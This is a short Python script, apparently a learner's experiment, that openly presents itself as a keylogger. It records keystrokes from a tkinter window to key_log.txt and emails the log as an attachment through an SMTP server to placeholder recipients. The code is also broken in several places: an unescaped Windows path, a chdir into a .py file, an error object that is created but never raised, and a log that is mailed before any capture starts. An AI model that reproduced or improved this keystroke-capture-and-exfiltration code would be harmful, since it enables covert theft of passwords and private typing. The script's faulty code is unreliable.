
import os
import shutil
import subprocess
import logging
import smtplib
import tkinter as tk
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE
from email import encoders

src_dir = "c:/Users/strke/OneDrive/Masaüstü/siber güvenlik/keyloggerDeneme1.py"
dst_dir = "c:/Users/strke/OneDrive/Masaüstü/siber güvenlik/keyloggerDeneme1.py_copy"
dst_path = "c:/Users/strke/OneDrive/Masaüstü/siber güvenlik/keyloggerDeneme1.py_copy\\keyloggerDeneme1.py"
subprocess.run(["move", dst_path, "C:\Users\strke\OneDrive\Masaüstü\siber güvenlik\keyloggerDeneme1.py"])
os.chdir("c:/Users/strke/OneDrive/Masaüstü/siber güvenlik/keyloggerDeneme1.py");   FileNotFoundError("C:\Users\strke\OneDrive\Masaüstü\siber güvenlik\keyloggerDeneme1.py");

subprocess.run(["python", "keyloggerDeneme1.py"])


# Set up logging to a dosya
logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def key_press(event):
  logging.info(event.char)

def key_release(event):
  logging.info(event.keysym)

# Create the main window
root = tk.Tk()
root.title("keyloggerDeneme1")
root.resizable(False, False)

# Bind the key press and release events to the corresponding functions
root.bind('<KeyPress>', key_press)
root.bind('<KeyRelease>', key_release)

# Create a frame to hold the label and button
frame = tk.Frame(root)
frame.pack()

# Create a label to display instructions to the user
label = tk.Label(frame, text="This is a keylogger program. Your keyboard inputs will be recorded to a file.")
label.pack()

# Create a button to close the program
button = tk.Button(frame, text="Close", command=root.destroy)
button.pack()

# Set up the email server and login credentials
email_server = "smtp.example.com"
email_user = "user@example.com"
email_password = "password"

# Set up the email message
msg = MIMEMultipart()
msg["From"] = email_user
msg["To"] = COMMASPACE.join(["recipient1@example.com", "recipient2@example.com"])
msg["Subject"] = "Keylogger Log File"

# Attach the keylogger log file to the email
with open("key_log.txt", "rb") as log_file:
    log_attachment = MIMEBase("application", "octet-stream", Name="key_log.txt")
    log_attachment.set_payload((log_file).read())
    encoders.encode_base64(log_attachment)
    log_attachment.add_header("Content-Disposition", "attachment", filename="key_log.txt")
    msg.attach(log_attachment)

# Send the email
server = smtplib.SMTP(email_server)
server.starttls()
server.login(email_user, email_password)
server.sendmail(email_user, msg["To"], msg.as_string())
server.quit()

# Run the main loop to capture keyboard events
root.mainloop()
